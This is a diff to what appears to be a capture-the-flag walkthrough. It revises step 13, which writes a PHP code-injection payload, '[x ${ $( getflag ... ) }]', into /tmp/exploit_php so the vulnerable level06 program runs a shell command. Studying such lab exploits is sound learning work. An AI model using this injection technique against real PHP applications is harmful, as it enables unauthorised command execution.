@@ -119,10 +119,10 @@
 	that will be invoked even in the double quotes context.
 
 13. __Action__ (Guest): create a file named `exploit_php`
-	containing the string ``[x ${`getflag >/tmp/getflag_as_flag06`}]``
+	containing the string ``[x ${ $( getflag >/tmp/getflag_as_flag06 ) }]``
 	in the `/tmp` directory
 	```sh
-	echo '[x ${`getflag >/tmp/getflag_as_flag06`}]' >/tmp/exploit_php
+	echo '[x ${ $( getflag >/tmp/getflag_as_flag06 ) }]' >/tmp/exploit_php
 	```
 
 14. __Action__ (Guest): execute the `level06` file with the `/tmp/exploit_php` file as argument
